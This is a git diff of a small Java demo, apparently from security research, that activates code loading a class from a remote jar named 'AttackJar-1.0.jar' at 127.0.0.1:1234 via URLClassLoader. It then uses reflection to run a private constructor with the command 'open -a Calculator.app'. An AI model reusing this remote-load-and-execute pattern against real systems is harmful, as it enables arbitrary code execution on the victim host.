@@ -1,9 +1,5 @@
 package org.example;
 
-import java.lang.reflect.Constructor;
-import java.net.URL;
-import java.net.URLClassLoader;
-
 /**
  * @author Whoopsunix
  */
@@ -17,23 +13,24 @@ public class Run {
 //        Class<?> loadedClass = classLoader.loadClass("org.example.Exec");
 //        Object object = loadedClass.newInstance();
 
-        URL url = new URL("http://127.0.0.1:1234/");
-        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
-        Class<?> loadedClass = classLoader.loadClass("org.example.Exec");
-        Object object = loadedClass.getConstructor(null).newInstance(null);
+//        java.net.URL url = new java.net.URL("http://127.0.0.1:1234/");
+//        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
+//        Class<?> loadedClass = classLoader.loadClass("org.example.Exec");
+//        Object object = loadedClass.getConstructor(null).newInstance(null);
 
         /**
          * 调用构造方法
          */
-//        URL url = new URL("http://127.0.0.1:1234/AttackJar-1.0.jar");
-//        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
-//        Class<?> loadedClass = classLoader.loadClass("org.example.ExecArg");
-//        // public
-////        Object object = loadedClass.getConstructor(String.class).newInstance("open -a Calculator.app");
-//        // private
-//        Constructor constructor = loadedClass.getDeclaredConstructor(String.class);
-//        constructor.setAccessible(true);
-//        Object object = constructor.newInstance("open -a Calculator.app");
+        java.net.URL url = new java.net.URL("http://127.0.0.1:1234/AttackJar-1.0.jar");
+        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
+        Class<?> loadedClass = classLoader.loadClass("org.example.ExecArg");
+        // public
+//        Object object = loadedClass.getConstructor(String.class).newInstance("open -a Calculator.app");
+        // private
+        Class cls = String.class;
+        java.lang.reflect.Constructor constructor = loadedClass.getDeclaredConstructor(cls);
+        constructor.setAccessible(true);
+        Object object = constructor.newInstance("open -a Calculator.app");
 
         /**
          * 调用方法
